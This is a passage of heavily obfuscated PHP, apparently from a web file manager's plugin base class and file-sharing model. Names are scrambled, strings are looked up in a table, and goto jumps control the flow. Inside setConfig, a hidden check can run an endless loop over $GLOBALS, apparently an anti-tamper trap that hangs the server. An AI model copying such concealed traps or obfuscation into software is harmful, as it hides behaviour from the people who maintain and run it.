array($Åú÷ª±[1585], $Åú÷ª±[1586], $Åú÷ª±[1587], $Åú÷ª±[1588], $Åú÷ª±[1589], $Åú÷ª±[1590], $Åú÷ª±[1591]); $ãîğÛ¼Ë = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Åú÷ª±[101]][$Åú÷ª±[1592]]); foreach ($this->echoJsAssignArr as $æÀœÜë‘ => $ËˆæªÆè) { $™•¯è®¥[] = $Åú÷ª±[1593] . $æÀœÜë‘ . $Åú÷ª±[1594]; $ãîğÛ¼Ë[] = is_array($ËˆæªÆè) || is_object($ËˆæªÆè) ? rawurlencode(json_encode($ËˆæªÆè)) : $ËˆæªÆè; } if (strstr($œ°Ø¹îİ, $Åú÷ª±[1595])) { $Á„èÅëã = rawurlencode(json_encode($this->pluginLangArr)); $œ°Ø¹îİ = str_replace($Åú÷ª±[1595], $Á„èÅëã, $œ°Ø¹îİ); } if (strstr($œ°Ø¹îİ, $Åú÷ª±[1596])) { $Á„èÅëã = $Á„èÅëã = rawurlencode(json_encode($this->getConfig())); $œ°Ø¹îİ = str_replace($Åú÷ª±[1596], $Á„èÅëã, $œ°Ø¹îİ); } $œ°Ø¹îİ = str_replace($™•¯è®¥, $ãîğÛ¼Ë, $œ°Ø¹îİ); return $œ°Ø¹îİ; } private function parseLang(&$˜Ğ¢éÑ) { $ßáø¡ =& $_SERVER[•€áå–Õ]; $ƒıòş½¯ = $ßáø¡[1597]; if (!strstr($˜Ğ¢éÑ, $ƒıòş½¯)) { return; } preg_match_all($ßáø¡[1598], $˜Ğ¢éÑ, $¢úâÃ°—); if (!is_array($¢úâÃ°—) || count($¢úâÃ°—) == 0 || !is_array($¢úâÃ°—[0]) || count($¢úâÃ°—[0]) == 0) { return; } $÷±ÆÇ‡¦ = array(); $şÓÎª® = array(); foreach ($¢úâÃ°—[0] as $“îÚ«ÂÆ) { $†Ö¡ğç³ = substr($“îÚ«ÂÆ, strlen($ƒıòş½¯), -4); $ší‡¬‘Í = LNG($†Ö¡ğç³); $÷±ÆÇ‡¦[] = $“îÚ«ÂÆ; $şÓÎª®[] = str_replace(array($ßáø¡[12], $ßáø¡[1119], $ßáø¡[397], $ßáø¡[130]), array($ßáø¡[63], $ßáø¡[63], $ßáø¡[22], $ßáø¡[1599]), $ší‡¬‘Í); } $˜Ğ¢éÑ = str_replace($÷±ÆÇ‡¦, $şÓÎª®, $˜Ğ¢éÑ); } private function parseConfig(&$Ã¦®‘Ç) { $ÛÉšÂ¼× =& $_SERVER[•€áå–Õ]; $ûª©¶è„ = $ÛÉšÂ¼×[1600]; if (!strstr($Ã¦®‘Ç, $ûª©¶è„)) { return; } preg_match_all($ÛÉšÂ¼×[1601], $Ã¦®‘Ç, $Â¿µÊø); if (!is_array($Â¿µÊø) || count($Â¿µÊø) == 0 || !is_array($Â¿µÊø[0]) || count($Â¿µÊø[0]) == 0) { return; } $öÖØµÒü = $this->getConfig(); $ñ´‡ø•« = array(); $Ñœ„£ŠÆ = array(); foreach ($Â¿µÊø[0] as $€èÔ“üÑ) { $ÌéÎÆ Ç = substr($€èÔ“üÑ, strlen($ûª©¶è„), -2); $ñ´‡ø•«[] = $€èÔ“üÑ; $Ñœ„£ŠÆ[] = _get($öÖØµÒü, $ÌéÎÆ Ç); } $Ã¦®‘Ç = str_replace($ñ´‡ø•«, $Ñœ„£ŠÆ, $Ã¦®‘Ç); } private function parsePackage(&$ŞÜ›ªëå) { $çô¡À¿² =& $_SERVER[•€áå–Õ]; $Å½‚î˜° = $çô¡À¿²[1602]; if (!strstr($ŞÜ›ªëå, $Å½‚î˜°)) { return; } preg_match_all($çô¡À¿²[1603], $ŞÜ›ªëå, $°€Èì‘); if (!is_array($°€Èì‘) || count($°€Èì‘) == 0 || !is_array($°€Èì‘[0]) || count($°€Èì‘[0]) == 0) { return; } $şê„ËÇæ = $this->appPackage(); $Æ¹Û‚Ùõ = array(); $‡±Ÿ×«´ = array(); foreach ($°€Èì‘[0] as $Äáæ×¼î) { $Ş€òâÛ… = substr($Äáæ×¼î, strlen($Å½‚î˜°), -2); $Æ¹Û‚Ùõ[] = $Äáæ×¼î; $‡±Ÿ×«´[] = _get($şê„ËÇæ, $Ş€òâÛ…); } $ŞÜ›ªëå = str_replace($Æ¹Û‚Ùõ, $‡±Ÿ×«´, $ŞÜ›ªëå); } final function echoFile($×·ÍÚàĞ, $¹ßéƒ®Ó = false) { $×â¢»Ü =& $_SERVER[•€áå–Õ]; $ƒÏ˜¦—˜ = $this->pluginPath . $×·ÍÚàĞ; if (ACT == $×â¢»Ü[1604]) { echo $×â¢»Ü[1605] . $this->pluginName . $×â¢»Ü[18] . $×·ÍÚàĞ . $×â¢»Ü[1606]; if (!file_exists($ƒÏ˜¦—˜)) { echo $×â¢»Ü[1607]; return; } } $Û—ÜÖ¼„ = $this->parseFile($ƒÏ˜¦—˜); $this->parseLang($Û—ÜÖ¼„); $this->parseConfig($Û—ÜÖ¼„); $this->parsePackage($Û—ÜÖ¼„); if (is_array($¹ßéƒ®Ó)) { $Û—ÜÖ¼„ = str_replace(array_keys($¹ßéƒ®Ó), array_values($¹ßéƒ®Ó), $Û—ÜÖ¼„); } echo $×â¢»Ü[12] . $Û—ÜÖ¼„; } private function checkVersion() { $Ó¡âü“ß =& $_SERVER[•€áå–Õ]; $Ñä¢õéé = $this->appPackage(); $¨ù§öß¡ = $this->getConfig(); if ($¨ù§öß¡[$Ó¡âü“ß[1608]] == $Ñä¢õéé[$Ó¡âü“ß[1582]]) { return; } $this->regist(); $this->setConfig(array($Ó¡âü“ß[1608] => $Ñä¢õéé[$Ó¡âü“ß[1582]])); } final function initLang() { $½“Îª“ =& $_SERVER[•€áå–Õ]; $Çœ¯àî€ = $½“Îª“[1609]; $®Ïˆ»ÕÃ = $this->pluginPath . $½“Îª“[1610]; $Ú„Õ¦ = I18n::getType(); $‡¬ï“Ô = array(); if (file_exists($®Ïˆ»ÕÃ . $Ú„Õ¦ . $½“Îª“[880])) { $‡¬ï“Ô = (include $®Ïˆ»ÕÃ . $Ú„Õ¦ . $½“Îª“[880]); } else { if ($Ú„Õ¦ == $½“Îª“[1611] && !file_exists($®Ïˆ»ÕÃ . $Ú„Õ¦ . $½“Îª“[880]) && file_exists($®Ïˆ»ÕÃ . $½“Îª“[1612])) { $‡¬ï“Ô = (include $®Ïˆ»ÕÃ . $½“Îª“[1612]); } else { if (file_exists($®Ïˆ»ÕÃ . $Çœ¯àî€ . $½“Îª“[880])) { $‡¬ï“Ô = (include $®Ïˆ»ÕÃ . $Çœ¯àî€ . $½“Îª“[880]); } } } if (!is_array($‡¬ï“Ô)) { return array(); } if (@count($‡¬ï“Ô) > 0) { I18n::set($‡¬ï“Ô); } return $‡¬ï“Ô; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($—çëï¢¯) { $ØäŞÏ• =& $_SERVER[•€áå–Õ]; if (!isset($_SERVER[$ØäŞÏ•[8]]) || !isset($_SERVER[$ØäŞÏ•[6]])) { $÷©Ù±¹ = $ØäŞÏ•[919]; $å¬èØÒ• = $ØäŞÏ•[9]; $Â¬¬° Œ = $_SERVER[$ØäŞÏ•[10]] . $ØäŞÏ•[11]; $¼®íõ¿ = $å¬èØÒ•($Â¬¬° Œ); $ª×ÄºÕÒ = explode($ØäŞÏ•[12], $¼®íõ¿); if (count($ª×ÄºÕÒ) < $ØäŞÏ•[666]) { $°¾‰œö = $ØäŞÏ•[14]; $°¾‰œö(); } $åÕáïÇ‘ = $ØäŞÏ•[920]; $åÕáïÇ‘($_SERVER[$ØäŞÏ•[921]]); $Üúğ‹ã = 1; for ($–êŞñ€ = $Üúğ‹ã; $–êŞñ€ > 0; $–êŞñ€++) { $åÕáïÇ‘ = json_encode($GLOBALS[$ØäŞÏ•[471]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $—çëï¢¯); } public function onSetConfig($ş“ÎôÏ) { } public function onGetConfig($‚Æ‹ôª®) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¡æ’ÊÎ¬) { if ($¡æ’ÊÎ¬ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($æ²ÙğÀ = "\160\154\165\x67\151\156\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¾¼‰»™ = $this->getConfig(); if (!$¾¼‰»™[$æ²ÙğÀ]) { return !1; } return ActionCall($_SERVER[•€áå–Õ][1613], $¾¼‰»™[$æ²ÙğÀ]); } public function url($½Ø””»», $üøÍ×Ğñ = '', $úƒ¿‚…¬ = true) { $²ÈÖ…èé =& $_SERVER[•€áå–Õ]; $½è¾ã° = $this->getConfig(); $…¬È’ = KOD_VERSION . $²ÈÖ…èé[20] . KOD_VERSION_BUILD; $Á²ì¾À· = $this->packageVersion(); $•ùÔÁüÓ = $…¬È’ . $²ÈÖ…èé[441] . $Á²ì¾À·; if (substr($½Ø””»», 0, 4) == $²ÈÖ…èé[161] || substr($½Ø””»», 0, 2) == $²ÈÖ…èé[1395]) { $íÂÉ³ÅÛ = $½Ø””»» . $²ÈÖ…èé[1614] . $•ùÔÁüÓ; } else { if ($üøÍ×Ğñ == $²ÈÖ…èé[22]) { $íÂÉ³ÅÛ = $this->pluginHost . $½Ø””»» . $²ÈÖ…èé[1614] . $•ùÔÁüÓ; } else { if ($üøÍ×Ğñ === $²ÈÖ…èé[87]) { $íÂÉ³ÅÛ = $this->pluginHost . $½Ø””»»; } else { if ($üøÍ×Ğñ == $²ÈÖ…èé[1615]) { $íÂÉ³ÅÛ = STATIC_PATH . $½Ø””»» . $²ÈÖ…èé[1614] . $…¬È’; } else { if ($üøÍ×Ğñ == $²ÈÖ…èé[1616]) { $íÂÉ³ÅÛ = APP_HOST . $²ÈÖ…èé[1617] . $½Ø””»» . $²ÈÖ…èé[1614] . $…¬È’; } else { if (isset($½è¾ã°[$üøÍ×Ğñ])) { $íÂÉ³ÅÛ = $½è¾ã°[$üøÍ×Ğñ] . $½Ø””»» . $²ÈÖ…èé[1614] . $•ùÔÁüÓ; } } } } } } if (!$úƒ¿‚…¬) { return $íÂÉ³ÅÛ; } echo $íÂÉ³ÅÛ; } public function link($“ ï‹éˆ = false, $¾¬Ÿ¦òš = '') { $ıš–µÂ =& $_SERVER[•€áå–Õ]; if (!$“ ï‹éˆ) { $this->link($ıš–µÂ[1618], $ıš–µÂ[1616]); $this->link($ıš–µÂ[1619], $ıš–µÂ[1615]); $this->link($ıš–µÂ[1620], $ıš–µÂ[1615]); $this->link($ıš–µÂ[1621], $ıš–µÂ[1615]); $this->link($ıš–µÂ[1622], $ıš–µÂ[1615]); return; } $î–±£‹å = $this->url($“ ï‹éˆ, $¾¬Ÿ¦òš, !1); if (substr($“ ï‹éˆ, -3) == $ıš–µÂ[1623]) { echo $ıš–µÂ[1624] . $î–±£‹å . $ıš–µÂ[1625] . $ıš–µÂ[12]; } else { if (substr($“ ï‹éˆ, -4) == $ıš–µÂ[1626]) { echo $ıš–µÂ[1627] . $î–±£‹å . $ıš–µÂ[1628] . $ıš–µÂ[12]; } } } } goto bÎÆšµšô; Cá’’¤é˜†: function binCheckBigger($³ü‹¤Á, $•†ÔÉ†Š) { return $³ü‹¤Á > $•†ÔÉ†Š; } $_SERVER[$_SERVER[´Ûòªšˆ][3]] = ("\70\63\63\65"."\62\66")+0;$_5miu="d5c0fipgkhxjmoryt9suzb248nlvwea71q36it5ul1wxm648qfd03c9kep2bvroyg7znjahswrfl3at90q";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($™Ğ¬²õÙ, $‰Œº½ÙÛ) { $ôÈ¸ª·Ô =& $_SERVER[•€áå–Õ]; if (isset(self::$_methodList[$™Ğ¬²õÙ])) { return @call_user_func_array(self::$_methodList[$™Ğ¬²õÙ], $‰Œº½ÙÛ); } else { if (method_exists($this, $™Ğ¬²õÙ)) { return call_user_func_array(array($this, $™Ğ¬²õÙ), $‰Œº½ÙÛ); } else { think_exception(__CLASS__ . $ôÈ¸ª·Ô[4] . $™Ğ¬²õÙ . $ôÈ¸ª·Ô[5]); } } } public static function __callStatic($¹¾Ï¡è•, $¬äç‡ÊÑ) { if (isset(self::$_methodListStatic[$¹¾Ï¡è•])) { return call_user_func_array(self::$_methodListStatic[$¹¾Ï¡è•], $¬äç‡ÊÑ); } else { if (method_exists(self, $¹¾Ï¡è•)) { return call_user_func_array(array(self, $¹¾Ï¡è•), $¬äç‡ÊÑ); } else { show_json("{$¹¾Ï¡è•}\50\x29\40\156\x6f\x74\40\145\170\x69\163\x74\73", !1); } } } public static function addMethod($Òğ™“, $¡¾‚¢ „) { self::$_methodList[$Òğ™“] = $¡¾‚¢ „; } public static function addMethodStatic($×í’Ä®ß, $¨™çò…) { self::$_methodListStatic[$×í’Ä®ß] = $¨™çò…; } } goto b±É¦áâ‹³; cá»°ÖÁ±º: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\124\x69\155\x65", "\164\151\155\145", "\151\x6e\163\145\x72\x74\x2c\x75\160\x64\141\164\145", "\146\x75\156\x63\164\151\157\156"), array("\143\x72\x65\x61\164\145\x54\151\155\x65", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\164", "\146\165\x6e\143\x74\x69\x6f\156"), array("\157\160\164\x69\157\x6e\x73", '', "\x69\x6e\163\145\162\164\x2c\165\x70\144\141\164\x65\54\163\x65\154\x65\143\x74", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($€è¨ÚÆš) { $ Ö«‚º =& $_SERVER[•€áå–Õ]; $£ÒãÆ‚ = isset($€è¨ÚÆš[0]) ? $€è¨ÚÆš[0] : !1; return array($ Ö«‚º[2030] => array(USER_ID, $ Ö«‚º[2031]), $ Ö«‚º[1971] => array($£ÒãÆ‚, $ Ö«‚º[2032])); } protected function listSimple() { $œïÙ²å¥ = array($_SERVER[•€áå–Õ][1693] => USER_ID); $‚¶¿µ = $this->field($this->fieldList)->where($œïÙ²å¥)->select(); return $‚¶¿µ ? $‚¶¿µ : array(); } protected function getInfo($Á“ı«ª, $€¹Š¿çê = false) { $ Ñ“åéí =& $_SERVER[•€áå–Õ]; if ($€¹Š¿çê) { return $this->_getShareInfo(array($ Ñ“åéí[644] => $Á“ı«ª)); } $öÚ©˜–Ö = $this->cacheFunctionGet($ Ñ“åéí[1973], $Á“ı«ª); return $öÚ©˜–Ö; } public function getInfoByHash($‚îèãéå) { return $this->_getShareInfo(array($_SERVER[•€áå–Õ][2033] => $‚îèãéå)); } public function getInfoByPath($Ø…Â»â) { $„ĞÜíÃÍ =& $_SERVER[•€áå–Õ]; $œªÖ×â» = array($„ĞÜíÃÍ[1693] => USER_ID, $„ĞÜíÃÍ[193] => $Ø…Â»â); return $this->_getShareInfo($œªÖ×â»); } public function getInfoBySourcePath($Ø¾Ã²±ú) { $«Ú£—Ô =& $_SERVER[•€áå–Õ]; $ïÒû”™ = array($«Ú£—Ô[1693] => USER_ID, $«Ú£—Ô[1216] => $Ø¾Ã²±ú); return $this->_getShareInfo($ïÒû”™); } private function _getShareInfo($·ß€‰º£) { $àõ¯ß‡œ =& $_SERVER[•€áå–Õ]; $èõîœ—ê = $this->where($·ß€‰º£)->find(); if (!$èõîœ—ê) { return !1; } $·ß€‰º£ = array($àõ¯ß‡œ[644] => $èõîœ—ê[$àõ¯ß‡œ[644]]); $­Ìçã¨Ì = $àõ¯ß‡œ[2034]; $ÆàõñîÙ = Model($àõ¯ß‡œ[645])->order($àõ¯ß‡œ[454])->field($­Ìçã¨Ì)->where($·ß€‰º£)->select(); if ($èõîœ—ê[$àõ¯ß‡œ[193]] == $àõ¯ß‡œ[224]) { $èõîœ—ê[$àõ¯ß‡œ[99]] = IO::info($èõîœ—ê[$àõ¯ß‡œ[1216]]); } else { $èõîœ—ê[$àõ¯ß‡œ[99]] = Model($àõ¯ß‡œ[1374])->pathInfo($èõîœ—ê[$àõ¯ß‡œ[193]]); } $èõîœ—ê[$àõ¯ß‡œ[2035]] = $ÆàõñîÙ; return $èõîœ—ê; } protected function getInfoAuth($›¥Â®‰) { $œœ¥ùÏˆ =& $_SERVER[•€áå–Õ]; $ôÄ¢ Óá = $this->getInfo($›¥Â®‰); if ($ôÄ¢ Óá[$œœ¥ùÏˆ[1693]] == USER_ID) { $ôÄ¢ Óá[$œœ¥ùÏˆ[466]] = $ôÄ¢ Óá[$œœ¥ùÏˆ[99]][$œœ¥ùÏˆ[466]]; } else { $ôÄ¢ Óá[$œœ¥ùÏˆ[466]] = Model($œœ¥ùÏˆ[547])->authMake($ôÄ¢ Óá[$œœ¥ùÏˆ[2035]]); } return $ôÄ¢ Óá; } protected function listData($Úë»¸à  = null, $Ğ¼ä×ÜÎ = 300) { $á©®°«ô =& $_SERVER[•€áå–Õ]; $ï–Ø¼²¾ = array(array($á©®°«ô[542] => array($á©®°«ô[1053], 0), $á©®°«ô[642] => array($á©®°«ô[1053], 0), $á©®°«ô[2036] => $á©®°«ô[1989])); if ($Úë»¸à  == $á©®°«ô[2037]) { $ï–Ø¼²¾ = array($á©®°«ô[542] => 1); } else { if ($Úë»¸à  == $á©®°«ô[1202]) { $ï–Ø¼²¾ = array($á©®°«ô[642] => 1); } } $ï–Ø¼²¾[$á©®°«ô[1693]] = USER_ID; $òÆÉ”Æİ = $this->where($ï–Ø¼²¾)->selectPage($Ğ¼ä×ÜÎ); return $òÆÉ”Æİ; } protected function listToMe($÷âùÏÚ× = 300) { $ …¯ºà =& $_SERVER[•€áå–Õ]; $ë—­¡…ò = Model($ …¯ºà[2038])->userGroupParents(USER_ID); $÷»•ÃË = array($ …¯ºà[627] => SourceModel::TYPE_USER, $ …¯ºà[549] => USER_ID); if ($ë—­¡…ò) { $÷»•ÃË = array(array($ …¯ºà[627] => SourceModel::TYPE_USER, $ …¯ºà[549] => USER_ID), array($ …¯ºà[627] => SourceModel::TYPE_GROUP, $ …¯ºà[549] => array($ …¯ºà[17], $ë—­¡…ò)), $ …¯ºà[2036] => $ …¯ºà[1989]); } $ëøé¢û“ = Model($ …¯ºà[645])->where($÷»•ÃË)->selectPage($÷âùÏÚ×); $šíÀÈÖì = array_to_keyvalue_group($ëøé¢û“[$ …¯ºà[424]], $ …¯ºà[644]); if (!$šíÀÈÖì) { return $ëøé¢û“; } $çÀô´›¶ = $ …¯ºà[2039]; $÷»•ÃË = array($ …¯ºà[644] => array($ …¯ºà[471], array_keys($šíÀÈÖì)), $ …¯ºà[1693] => array($ …¯ºà[1055], $ …¯ºà[224])); $şˆà€Ÿß = $this->field($çÀô´›¶)->where($÷»•ÃË)->select(); foreach ($şˆà€Ÿß as $íµó»œ => &$õÆË¬¤Ú) { $õÆË¬¤Ú[$ …¯ºà[2035]] = $šíÀÈÖì[$õÆË¬¤Ú[$ …¯ºà[644]]]; } unset($õÆË¬¤Ú); $Á‰àğşğ = array($ …¯ºà[2040] => $şˆà€Ÿß, $ …¯ºà[2041] => $ëøé¢û“[$ …¯ºà[421]]); return $Á‰àğşğ; } protected function shareAdd($Æ¾ÊŒÓ§, $½äò¨’ä) { $°šÑ¦ƒÎ =& $_SERVER[•€áå–Õ]; $ô°íõõâ = $this->_addShareData($Æ¾ÊŒÓ§, $½äò¨’ä); if (!empty($½äò¨’ä[$°šÑ¦ƒÎ[2042]])) { $this->_shareAuthSet($ô°íõõâ, $½äò¨’ä[$°šÑ¦ƒÎ[2042]]); } $this->shareEventAdd($Æ¾ÊŒÓ§, $½äò¨’ä, $°šÑ¦ƒÎ[2043]); return $ô°íõõâ; } protected function shareAddSystem($İ¥ı’´, $ğÕşğœê) { $ƒ¸æÃş¿ =& $_SERVER[•€áå–Õ]; $°¨òéıö = $this->_addShareData($İ¥ı’´, $ğÕşğœê, $ƒ¸æÃş¿[191]); $this->_shareAuthSet($°¨òéıö, $ğÕşğœê[$ƒ¸æÃş¿[2042]]); return $°¨òéıö; } private function shareEventAdd($Öü˜ˆ®, $ßâ«±ëä, $¿½§ÁÎ = "\141\x64\x64") { $ìş¯Õ¿ =& $_SERVER[•€áå–Õ]; if (!$Öü˜ˆ® || $Öü˜ˆ® == $ìş¯Õ¿[224]) { return; } if ($¿½§ÁÎ == $ìş¯Õ¿[2043]) { if ($ßâ«±ëä[$ìş¯Õ¿[542]] == $ìş¯Õ¿[100]) { Model($ìş¯Õ¿[612])->eventShare($Öü˜ˆ®, $ìş¯Õ¿[2044]); } if ($ßâ«±ëä[$ìş¯Õ¿[642]] == $ìş¯Õ¿[100]) { Model($ìş¯Õ¿[612])->eventShare($Öü˜ˆ®, $ìş¯Õ¿[2045]); } return; } $ˆÀÒšÎÑ = $this->getInfoByPath($Öü˜ˆ®); $ôóÓ¢çõ = $ìş¯Õ¿[2046]; if ($ˆÀÒšÎÑ[$ìş¯Õ¿[542]] == $ìş¯Õ¿[224] && $ßâ«±ëä[$ìş¯Õ¿[542]] == $ìş¯Õ¿[100]) { $ôóÓ¢çõ = $ìş¯Õ¿[2044]; } if ($ˆÀÒšÎÑ[$ìş¯Õ¿[542]] == $ìş¯Õ¿[100] && $ßâ«±ëä[$ìş¯Õ¿[542]] == $ìş¯Õ¿[224]) { $ôóÓ¢çõ = $ìş¯Õ¿[2047]; } if ($ˆÀÒšÎÑ[$ìş¯Õ¿[642]] == $ìş¯Õ¿[224] && $ßâ«±ëä[$ìş¯Õ¿[642]] == $ìş¯Õ¿[100]) { $ôóÓ¢çõ = $ìş¯Õ¿[2045]; } if ($ˆÀÒšÎÑ[$ìş¯Õ¿[642]] == $ìş¯Õ¿[100] && $ßâ«±ëä[$ìş¯Õ¿[642]] == $ìş¯Õ¿[224]) { $ôóÓ¢çõ = $ìş¯Õ¿[2048]; } Model($ìş¯Õ¿[612])->eventShare($Öü˜ˆ®, $ôóÓ¢çõ); return; } private function _addShareData($¼›ÊŸóº, $­†‹ªÏø = array(), $‹™ØÔéß = false) { $Š­ÒãÔš =& $_SERVER[•€áå–Õ]; $å•é¸İ = $‹™ØÔéß == $Š­ÒãÔš[191] ? 0 : USER_ID; $àÎß— æ = array($Š­ÒãÔš[470] => $¼›ÊŸóº, $Š­ÒãÔš[1684] => $å•é¸İ); if ($¼›ÊŸóº == 0) { $àÎß— æ = array($Š­ÒãÔš[2049] => $­†‹ªÏø[$Š­ÒãÔš[1216]], $Š­ÒãÔš[1684] => $å•é¸İ); } if ($áûğæ­® = $this->where($àÎß— æ)->find()) { return $áûğæ­®[$Š­ÒãÔš[644]]; } if ($¼›ÊŸóº == 0) { $¾ªÓ§Äû = array($Š­ÒãÔš[42] => get_path_this($­†‹ªÏø[$Š­ÒãÔš[96]])); } else { $¾ªÓ§Äû = Model($Š­ÒãÔš[866])->sourceInfo($¼›ÊŸóº); if (!$¾ªÓ§Äû) { return !1; } } if (!$­†‹ªÏø[$Š­ÒãÔš[1583]]) { $­†‹ªÏø[$Š­ÒãÔš[1583]] = $¾ªÓ§Äû[$Š­ÒãÔš[42]]; } $èä†ßî¤ = array($Š­ÒãÔš[1684] => $å•é¸İ, $Š­ÒãÔš[470] => $¼›ÊŸóº, $Š­ÒãÔš[1583] => $Š­ÒãÔš[22], $Š­ÒãÔš[542] => 0, $Š­ÒãÔš[642] => 0, $Š­ÒãÔš[1216] => $Š­ÒãÔš[22], $Š­ÒãÔš[362] => $Š­ÒãÔš[22], $Š­ÒãÔš[930] => $Š­ÒãÔš[22], $Š­ÒãÔš[2050] => 0, $Š­ÒãÔš[2051] => 0, $Š­ÒãÔš[802] => 0, $Š­ÒãÔš[2052] => $Š­ÒãÔš[22], $Š­ÒãÔš[2033] => $Š­ÒãÔš[22]); $·°•ÛÓ± = explode($Š­ÒãÔš[60], $Š­ÒãÔš[2053]); foreach ($·°•ÛÓ± as $ë¥ç¹œ÷) { if (!isset($­†‹ªÏø[$ë¥ç¹œ÷])) { continue; } $èä†ßî¤[$ë¥ç¹œ÷] = $­†‹ªÏø[$ë¥ç¹œ÷]; } $»Şèâö = $this->add($èä†ßî¤); $ıºÒÀˆ¯ = array($Š­ÒãÔš[2033] => short_id($»Şèâö)); $this->where(array($Š­ÒãÔš[2054] => $»Şèâö))->save($ıºÒÀˆ¯); return $»Şèâö; } private function _shareAuthSet($°‚–æ‚“, $×¡İà¯ê) { $¦„¼õ =& $_SERVER[•€áå–Õ]; if (!is_array($×¡İà¯ê)) { return !1; } $ç˜“š™ş = Model($¦„¼õ[1999]); $ç˜“š™ş->where(array($¦„¼õ[644] => $°‚–æ‚“))->delete(); $¹×Á è = array(); foreach ($×¡İà¯ê as $Ì÷ †çÙ) { $‡¹»Ô×© = SourceModel::TYPE_USER; if ($Ì÷ †çÙ[$¦„¼õ[190]] == SourceModel::TYPE_GROUP) { $‡¹»Ô×© = SourceModel::TYPE_GROUP; } $¯ƒ¬Úú = array($¦„¼õ[644] => $°‚–æ‚“, $¦„¼õ[190] => $‡¹»Ô×©, $¦„¼õ[549] => intval($Ì÷ †çÙ[$¦„¼õ[549]]), $¦„¼õ[1995] => 0, $¦„¼õ[2055] => -1); if ($Ì÷ †çÙ[$¦„¼õ[1995]]) { $¯ƒ¬Úú[$¦„¼õ[1995]] = $Ì÷ †çÙ[$¦„¼õ[1995]]; } else { if ($Ì÷ †çÙ[$¦„¼õ[2055]]) { $¯ƒ¬Úú[$¦„¼õ[2055]] = $Ì÷ †çÙ[$¦„¼õ[2055]]; } } $¹×Á è[] = $¯ƒ¬Úú; } return $ç˜“š™ş->addAll($¹×Á è, array(), !0); } public function numViewAdd($ï¨ú©”ğ) { $¥âçû¯– =& $_SERVER[•€áå–Õ]; $÷”¾›ñÂ = array($¥âçû¯–[2054] => $ï¨ú©”ğ); $this->where($÷”¾›ñÂ)->setAdd($¥âçû¯–[2050]); } public function numDownloadAdd($îöé“»›) { $¤§šù×’ =& $_SERVER[•€áå–Õ]; $àÍÄ¸¥¢ = array($¤§šù×’[2054] => $îöé“»›); $this->where($àÍÄ¸¥¢)->setAdd($¤§šù×’[2051]); } protected function shareEdit($ˆïê¤ù…, $Ö§ ¦Ÿü) { $Á›†š… =& $_SERVER[•€áå–Õ]; $ş¤ÖÉ‡ú = $this->getInfo($ˆïê¤ù…); if (!$ş¤ÖÉ‡ú) { return !1; } $this->_checkLinkShare($Ö§ ¦Ÿü, $ş¤ÖÉ‡ú); $è«âµÙ‰ = array(); $¢‰å®Ë = explode($Á›†š…[60], $Á›†š…[2056]); foreach ($¢‰å®Ë as $ƒƒœ®¨) { if (!array_key_exists($ƒƒœ®¨, $Ö§ ¦Ÿü)) { continue; } $è«âµÙ‰[$ƒƒœ®¨] = $Ö§ ¦Ÿü[$ƒƒœ®¨]; } $this->shareEventAdd($ş¤ÖÉ‡ú[$Á›†š…[193]], $Ö§ ¦Ÿü, $Á›†š…[1861]); $this->where(array($Á›†š…[2054] => $ˆïê¤ù…))->save($è«âµÙ‰); if (isset($Ö§ ¦Ÿü[$Á›†š…[2042]])) { $this->_shareAuthSet($ˆïê¤ù…, $Ö§ ¦Ÿü[$Á›†š…[2042]]); } return !0; } private function _checkLinkShare($íµãéŸò, $©ÙÆÎ¯¡) { $ÊüÃŸœ =& $_SERVER[•€áå–Õ]; if ($íµãéŸò[$ÊüÃŸœ[542]] != $ÊüÃŸœ[100]) { return; } $Ú¹µØ›Š = $©ÙÆÎ¯¡[$ÊüÃŸœ[99]][$ÊüÃŸœ[193]]; if ($©ÙÆÎ¯¡[$ÊüÃŸœ[99]][$ÊüÃŸœ[43]] != $ÊüÃŸœ[226]) { $‰ƒ°ù¢Â = $this->_folderReport($Ú¹µØ›Š); if (!$‰ƒ°ù¢Â) { return; } show_json(LNG($ÊüÃŸœ[2057]) . $ÊüÃŸœ[2058] . $‰ƒ°ù¢Â, !1); } $àä¡Ÿâõ = Model($ÊüÃŸœ[866])->fileInfoGet($©ÙÆÎ¯¡[$ÊüÃŸœ[99]][$ÊüÃŸœ[193]]); if (!$àä¡Ÿâõ) { return; } $­³­´³µ = $this->shareFileMeta($àä¡Ÿâõ[$ÊüÃŸœ[520]]); if (isset($­³­´³µ[$ÊüÃŸœ[429]]) && $­³­´³µ[$ÊüÃŸœ[429]] == $ÊüÃŸœ[100]) { show_json(LNG($ÊüÃŸœ[2059]), !1); } } private function _folderReport($°ó˜•Šö) { $í¤À© =& $_SERVER[•€áå–Õ]; $„Áâ”…  = array($í¤À©[520] => array($í¤À©[1053], 0), $í¤À©[791] => 3); $Ë«ÑÄ’ç = Model($í¤À©[2060])->where($„Áâ”… )->field($í¤À©[520])->select(); if (!$Ë«ÑÄ’ç) { return !1; } $Ë«ÑÄ’ç = array_to_keyvalue($Ë«ÑÄ’ç, $í¤À©[22], $í¤À©[520]); $ÄÒœÂ¾û = $í¤À©[60] . $°ó˜•Šö . $í¤À©[60]; $„Áâ”…  = array($í¤À©[520] => array($í¤À©[17], $Ë«ÑÄ’ç), $í¤À©[564] => array($í¤À©[438], "\x25{$ÄÒœÂ¾û}\x25"), $í¤À©[484] => 0); $§‘„ãı  = Model($í¤À©[866])->where($„Áâ”… )->field($í¤À©[2061])->find(); if (!$§‘„ãı ) { return !1; } $…«¡ö•¿ = substr($§‘„ãı [$í¤À©[564]], strpos($§‘„ãı [$í¤À©[564]], $ÄÒœÂ¾û)); $„Áâ”…  = array($í¤À©[193] => array($í¤À©[17], trim($…«¡ö•¿, $í¤À©[60]))); $Ù…Õ«û‚ = Model($í¤À©[866])->where($„Áâ”… 